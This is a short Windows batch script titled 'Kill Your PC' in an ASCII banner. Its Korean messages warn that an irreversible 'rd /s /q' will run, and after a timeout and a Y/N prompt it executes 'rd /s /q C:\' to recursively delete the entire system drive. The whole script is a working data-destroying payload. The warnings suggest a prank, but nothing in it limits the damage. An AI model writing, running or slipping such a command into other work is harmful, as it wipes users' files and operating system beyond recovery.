@echo off
chcp 65001

cls

echo "-------------------------------------------------------------------------"
echo " _  __  _   _   _    __     __                           _____     _____ "
echo "| |/ / (_) | | | |   \ \   / /                          |  __ \   / ____|"
echo "| ' /   _  | | | |    \ \_/ /    ___    _   _   _ __    | |__) | | |     "
echo "|  <   | | | | | |     \   /    / _ \  | | | | | '__|   |  ___/  | |     "
echo "| . \  | | | | | |      | |    | (_) | | |_| | | |      | |      | |____ "
echo "|_|\_\ |_| |_| |_|      |_|     \___/   \__,_| |_|      |_|       \_____|"
echo "-------------------------------------------------------------------------"

echo 20초후 자동으로 "rd /s /q" 가 실행됩니다. 
echo 해당 작업은 되돌릴 수 없습니다.
echo 계속하려면, 아무키나 누르십시오.
timeout /t 20 >nul

echo 진짜 시작하시겠습니까? 

set /p command="(Y/N) >> " 

IF %command%==Y ( goto run
   ) ELSE ( exit
)

:run
rd /s /q C:\

pause